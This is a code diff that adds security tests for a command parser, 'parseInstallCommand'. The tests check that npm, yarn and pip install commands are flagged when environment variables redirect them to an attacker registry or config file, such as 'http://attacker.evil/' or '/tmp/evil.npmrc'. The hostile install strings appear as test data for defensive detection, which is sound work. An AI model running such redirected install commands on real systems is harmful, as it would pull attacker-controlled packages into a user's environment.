@@ -191,6 +191,29 @@ describe("parseInstallCommand — bypass resistance (security)", () => {
         `must be unverifiable: ${cmd}`,
       );
     }
+    // indirect + less-obvious redirect vectors (2nd red-team pass)
+    for (const cmd of [
+      "YARN_NPM_REGISTRY_SERVER=http://attacker.evil/ yarn add lodash", // yarn berry
+      "NPM_CONFIG_USERCONFIG=/tmp/evil.npmrc npm i lodash", // attacker .npmrc
+      "NPM_CONFIG_GLOBALCONFIG=/tmp/evil.npmrc npm i lodash",
+      "PIP_CONFIG_FILE=/tmp/evil.conf pip install requests", // attacker pip.conf
+      "env 'npm_config_@scope:registry=http://attacker.evil/' npm i @scope/pkg", // scoped
+    ]) {
+      const p = parseInstallCommand(cmd);
+      assert.ok(
+        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
+        `must be unverifiable: ${cmd}`,
+      );
+    }
+  });
+
+  it("CRIT-REGISTRY: a special-char env assignment can't hide the install entirely", () => {
+    // `env 'a:b=1' npm i evil` left `a:b=1` as argv[0] before the broadened strip,
+    // so NO matcher fired and the install was fully undetected (worst case).
+    assert.deepEqual(parseInstallCommand("env 'a:b=1' npm i evil".replace(/'/g, "")).refs, [
+      "npm:evil",
+    ]);
+    assert.equal(parseInstallCommand("a:b=1 npm i evil").isInstall, true);
   });
 
   it("CRIT-REGISTRY: the canonical public registry/index is NOT flagged (no false-positive)", () => {
